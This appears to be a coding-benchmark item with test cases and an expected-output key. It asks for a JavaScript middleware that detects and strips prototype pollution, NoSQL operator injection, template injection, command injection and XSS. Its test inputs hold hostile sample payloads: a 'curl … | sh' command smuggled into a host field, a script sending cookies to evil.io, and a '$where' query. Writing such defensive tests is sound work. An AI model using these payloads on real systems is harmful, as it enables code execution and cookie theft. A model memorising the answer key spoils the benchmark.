---
id: sec-hotpatch-sanitizer
title: Security: Runtime Prototype-Pollution, NoSQLi & SSTI Hot-Patcher
category: security
language: javascript
functionName: applyRuntimeHotPatch
executable: true
testCases: [{"input":[{"username":"alice_01","bio":"Senior Cloud Architect","amount":250.5,"filter":{"price":{"$gt":10,"$lte":500}}},{"username":{"type":"identifier"},"bio":{"type":"safeText"},"amount":{"type":"number"},"filter":{"type":"object","allowOperators":true}},{"maxDepth":4,"maxKeys":20}],"expected":{"safe":true,"action":"ALLOW","threats":[],"sanitized":{"username":"alice_01","bio":"Senior Cloud Architect","amount":250.5,"filter":{"price":{"$gt":10,"$lte":500}}}}},{"input":[{"username":"bob_99","user.__proto__.isAdmin":true,"a[prototype][pwn]":1,"nested":{"constructor":{"prototype":{"polluted":true}},"keep":"ok"}},{"username":{"type":"identifier"}},{"maxDepth":5,"maxKeys":20}],"expected":{"safe":false,"action":"SANITIZE","threats":["PROTO_POLLUTION"],"sanitized":{"username":"bob_99","nested":{"keep":"ok"}}}},{"input":[{"username":"admin","password":{"$ne":null}},{"username":{"type":"identifier"},"password":{"type":"identifier"}},{"maxDepth":4,"maxKeys":15}],"expected":{"safe":false,"action":"SANITIZE","threats":["NOSQL_INJECTION"],"sanitized":{"username":"admin","password":null}}},{"input":[{"filter":{"status":{"$in":["active","pending"]},"$where":"this.credits > 9999"}},{"filter":{"type":"object","allowOperators":true}},{"maxDepth":4,"maxKeys":15}],"expected":{"safe":false,"action":"SANITIZE","threats":["NOSQL_INJECTION"],"sanitized":{"filter":{"status":{"$in":["active","pending"]}}}}},{"input":[{"username":"${process.env.DB_PASS}","bio":"Hello {{7*7}} world <% evil() %>!"},{"username":{"type":"identifier"},"bio":{"type":"safeText"}},{"maxDepth":4,"maxKeys":15}],"expected":{"safe":false,"action":"SANITIZE","threats":["SSTI_INJECTION"],"sanitized":{"username":null,"bio":"Hello  world !"}}},{"input":[{"host":"prod-db; curl http://169.254.169.254 | sh","env":"prod_us_east"},{"host":{"type":"identifier"},"env":{"type":"identifier"}},{"maxDepth":4,"maxKeys":15}],"expected":{"safe":false,"action":"SANITIZE","threats":["CMD_INJECTION"],"sanitized":{"host":null,"env":"prod_us_east"}}},{"input":[{"bio":"Welcome <script>fetch('https://evil.io?c='+document.cookie)</script><img src=x onerror=alert(1)> team"},{"bio":{"type":"safeText"}},{"maxDepth":4,"maxKeys":15}],"expected":{"safe":false,"action":"SANITIZE","threats":["XSS_INJECTION"],"sanitized":{"bio":"Welcome  team"}}},{"input":[{"username":"valid_user","x.__proto__.y":1,"password":{"$gt":""},"bio":"Hi {{user.secret}} <script> evil() </script>"},{"username":{"type":"identifier"},"password":{"type":"identifier"},"bio":{"type":"safeText"}},{"maxDepth":5,"maxKeys":20}],"expected":{"safe":false,"action":"SANITIZE","threats":["NOSQL_INJECTION","PROTO_POLLUTION","SSTI_INJECTION","XSS_INJECTION"],"sanitized":{"username":"valid_user","password":null,"bio":"Hi"}}},{"input":[{"a":{"b":{"c":{"d":1}}}},{},{"maxDepth":3,"maxKeys":20}],"expected":{"safe":false,"action":"REJECT","threats":["RESOURCE_BOMB"],"sanitized":null}},{"input":[{"k1":1,"k2":2,"k3":[{"k4":4,"k5":5},{"k6":6}]},{},{"maxDepth":5,"maxKeys":5}],"expected":{"safe":false,"action":"REJECT","threats":["RESOURCE_BOMB"],"sanitized":null}},{"input":[[{"username":"alice"}],{"username":{"type":"identifier"}},{"maxDepth":4,"maxKeys":10}],"expected":{"safe":false,"action":"REJECT","threats":["INVALID_ROOT"],"sanitized":null}},{"input":[{"username":"bad space!","amount":"Infinity","filter":["not-an-object"]},{"username":{"type":"identifier"},"amount":{"type":"number"},"filter":{"type":"object"}},{"maxDepth":4,"maxKeys":15}],"expected":{"safe":false,"action":"SANITIZE","threats":["TYPE_MISMATCH"],"sanitized":{"username":null,"amount":null,"filter":null}}}]
---
You are implementing a runtime application self-protection (RASP) middleware function (`applyRuntimeHotPatch`) that inspects and sanitizes untrusted JSON request payloads against Prototype Pollution, NoSQL Operator Injection, Server-Side Template Injection (SSTI), Command Injection, Cross-Site Scripting (XSS), and structural Denial-of-Service (DoS) bombs.

Signature: `applyRuntimeHotPatch(payload, schema, limits)`

### Inputs
- `payload`: parsed JSON input value.
- `schema`: object mapping top-level field names to validation rules:
  `{ [fieldName]: { type: "identifier" | "safeText" | "number" | "object", allowOperators?: boolean } }`
- `limits`: `{ maxDepth: number, maxKeys: number }`

### Output Format
Return an object with the exact shape:
`{ safe: boolean, action: "ALLOW" | "SANITIZE" | "REJECT", threats: string[], sanitized: object | null }`

---

### Evaluation Pipeline (Enforce in exact order 1 → 5)

#### 1. Structural DoS & Root Validation (`INVALID_ROOT`, `RESOURCE_BOMB`)
- **Root Check**: `payload` must be a non-null plain object (`typeof payload === "object" && payload !== null && !Array.isArray(payload)`). Otherwise immediately return:
  `{ safe: false, action: "REJECT", threats: ["INVALID_ROOT"], sanitized: null }`.
- **Depth & Key Count Check**: Traverse `payload` recursively before stripping:
  - Count `totalKeys` as the sum of `Object.keys(obj).length` across the root object and all nested plain objects (including plain objects inside arrays).
  - Measure `maxObservedDepth`: an empty root object `{}` has depth `0`; the root object's own keys are at depth `1`; each nested plain object increases depth by `+1` (arrays themselves do not add to depth, but plain objects inside arrays do — e.g., `{ a: [{ b: 1 }] }` has depth `2` and `2` total keys).
  - If `maxObservedDepth > limits.maxDepth` OR `totalKeys > limits.maxKeys`, immediately return:
    `{ safe: false, action: "REJECT", threats: ["RESOURCE_BOMB"], sanitized: null }`.

#### 2. Prototype Pollution Detection & Stripping (`PROTO_POLLUTION`)
- Recursively walk all plain objects (and arrays) to build a clean `sanitized` copy.
- For every property key `k` on any object:
  - Split `k` on `.`, `[`, and `]` (ignoring empty tokens).
  - If ANY segment is `"__proto__"`, `"constructor"`, or `"prototype"` (case-sensitive — covering nested objects like `{ constructor: { prototype: ... } }` as well as flat path keys like `"user.__proto__.isAdmin"` or `"a[prototype][pwn]"`):
    - Record `"PROTO_POLLUTION"` in `threats`.
    - **Omit/strip** key `k` (and its entire subtree) from `sanitized`.

#### 3. NoSQL Operator Injection (`NOSQL_INJECTION`)
- For any remaining key `k` starting with `"$"` (such as `"$ne"`, `"$gt"`, `"$in"`, `"$where"`, `"$function"`) at any depth inside top-level field `topKey`:
  - Let `allowOps = Boolean(schema && schema[topKey] && schema[topKey].allowOperators === true)`.
  - Note: `"$where"` and `"$function"` (server-side JavaScript execution operators) are **ALWAYS forbidden**, even when `allowOps === true`.
  - Other `"$"` operators are forbidden whenever `!allowOps`.
  - If key `k` is forbidden, record `"NOSQL_INJECTION"` in `threats` and **omit/strip** key `k` from the object.
- **Empty Operator-Object Cleanup**: If a top-level field `topKey` has a primitive schema type (`"identifier"`, `"safeText"`, or `"number"`), its original value was a plain object, and **all** of its keys were stripped by Step 2 or Step 3 (leaving `{}`), set `sanitized[topKey] = null` and skip Step 4 for `topKey` (do not double-flag `TYPE_MISMATCH`).

#### 4. Schema-Driven Type & Content Sanitization (`SSTI_INJECTION`, `CMD_INJECTION`, `XSS_INJECTION`, `TYPE_MISMATCH`)
For each top-level key `k` present in `sanitized` that has a rule `schema[k]` (and was not already set to `null` by Step 3's empty operator-object cleanup):
- **`schema[k].type === "identifier"`**:
  - If `typeof val !== "string"`, record `"TYPE_MISMATCH"` and set `sanitized[k] = null`.
  - Else if `val` contains `"{{"`, `"${"`, or `"<%"`, record `"SSTI_INJECTION"` and set `sanitized[k] = null`.
  - Else if `val` contains `";"`, `"|"`, `"&&"`, `` "`" ``, or `"$("`, record `"CMD_INJECTION"` and set `sanitized[k] = null`.
  - Else if `!/^[a-zA-Z0-9_-]{1,64}$/.test(val)`, record `"TYPE_MISMATCH"` and set `sanitized[k] = null`.
- **`schema[k].type === "safeText"`**:
  - If `typeof val !== "string"`, record `"TYPE_MISMATCH"` and set `sanitized[k] = null`.
  - Else:
    1. If `val` matches `/\{\{[\s\S]*?\}\}|\$\{[\s\S]*?\}|<%[\s\S]*?%>/`, record `"SSTI_INJECTION"` and strip all matching `{{...}}`, `${...}`, and `<%...%>` blocks.
    2. If the string matches `/<script|javascript:|onerror\s*=|onload\s*=/i`, record `"XSS_INJECTION"`, strip all `<script[\s\S]*?>[\s\S]*?<\/script>` blocks (case-insensitive), strip all remaining HTML tags `<[^>]+>`, and strip `javascript:` (case-insensitive).
    3. Trim leading/trailing whitespace (`.trim()`) and store in `sanitized[k]`.
- **`schema[k].type === "number"`**:
  - Must satisfy `typeof val === "number" && Number.isFinite(val)`. Otherwise record `"TYPE_MISMATCH"` and set `sanitized[k] = null`.
- **`schema[k].type === "object"`**:
  - Must be a non-null plain object (`typeof val === "object" && val !== null && !Array.isArray(val)`). Otherwise record `"TYPE_MISMATCH"` and set `sanitized[k] = null`.

#### 5. Final Result
- Deduplicate `threats` and sort alphabetically (`threats.sort()`).
- Return `{ safe: threats.length === 0, action: threats.length === 0 ? "ALLOW" : "SANITIZE", threats, sanitized }`.

Your answer must be a single, complete JavaScript function named exactly `applyRuntimeHotPatch` and nothing else (no test/driver code, no exports, no usage examples).

Output ONLY the solution as a single fenced ```javascript code block. No prose, explanation, comments outside the code, preamble, or postscript — nothing before or after the single code block.
